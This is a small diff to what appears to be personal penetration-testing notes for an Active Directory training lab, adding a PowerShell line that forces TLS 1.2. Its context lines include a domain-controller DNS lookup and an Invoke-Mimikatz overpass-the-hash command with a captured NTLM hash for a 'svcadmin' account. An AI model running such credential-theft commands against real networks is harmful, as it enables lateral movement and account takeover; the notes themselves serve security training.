@@ -3,6 +3,9 @@ nslookup
 set type=all
 _ldap._tcp.dc._msdcs.Domain_Name
 
+Powershell use TLS 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 -OverPass the Hash (local PC) and create Powershell with te captured NTML user ('svcadmin') privilege
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
 
